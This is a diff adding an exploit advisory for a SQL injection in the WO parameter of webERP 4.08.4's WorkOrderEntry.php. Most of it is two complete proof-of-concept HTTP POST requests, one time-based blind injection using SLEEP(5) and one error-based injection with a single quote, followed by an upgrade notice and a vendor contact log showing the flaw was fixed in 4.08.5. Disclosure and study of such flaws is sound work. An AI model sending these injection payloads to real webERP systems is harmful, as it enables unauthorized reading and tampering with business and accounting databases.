@@ -1,0 +1,55 @@
+# Exploit Title: webERP <=4.08.4 WorkOrderEntry.php SQL Injection Vulnerability
+# Date: 14/09/2012
+# Exploit Author: modpr0be (modpr0be[at]spentera.com)
+# Vendor Homepage: http://www.weberp.org
+# Software Link: http://sourceforge.net/projects/web-erp/files/
+# Version: 4.08.4
+# Tested on: Windows 2003 Standard Edition, XAMPP 1.7.4 (Default Config)
+# CVE: -
+
+# Software Description
+# webERP is a mature open-source ERP system providing best practise, multi-user business 
+# administration and accounting tools over the web.
+
+# Vulnerability Overview
+# webERP is vulnerable to SQL Injection vulnerability in the WorkOrderEntry.php within the WO parameter.
+# Due tue unvalidated input, when the single quote is inserted the web application throw a database error
+# message that indicated a SQL Injection is exist. 
+# Another test was performed and indicated that the WO parameter is also vulnerable to time-based blind sql injection.
+# However, the attacker must be in authenticated session to exploit the vulnerability.
+
+# POC (authenticated session needed):
+# Time-based Blind SQL Injection
+POST /weberp/WorkOrderEntry.php HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Cookie: PHPSESSID=n9g1ts0s7oigk88eto8f8nm111
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 207
+FormID=ff60696dab6b35c56558628b7237a624be19ad11&WO=33' AND SLEEP(5) AND '1'='1&StockLocation=MEL&StartDate=14%2F09%2F2012&RequiredBy=14%2F09%2F2012&NumberOfOutputs=0&submit=&StockCat=All&Keywords=&StockCode=
+
+# Error-based SQL Injection
+POST /weberp/WorkOrderEntry.php HTTP/1.1
+Host: 1.1.1.1
+User-Agent: Mozilla/5.0 (X11; Linux i686; rv:12.0) Gecko/20100101 Firefox/12.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Connection: keep-alive
+Cookie: PHPSESSID=n9g1ts0s7oigk88eto8f8nm111
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 207
+FormID=ff60696dab6b35c56558628b7237a624be19ad11&WO=33'&StockLocation=MEL&StartDate=14%2F09%2F2012&RequiredBy=14%2F09%2F2012&NumberOfOutputs=0&submit=&StockCat=All&Keywords=&StockCode=
+
+# Solution
+# Upgrade to latest version here: http://sourceforge.net/projects/web-erp/
+
+# Vendor Contact Log
+08/29/2012 - Bug found, submitted to Bug Report
+08/29/2012 - Vendor fix the bug, and request testing on patch version
+09/03/2012 - Confirm no vulnerablity found.
+09/11/2012 - webERP 4.08.5 released.
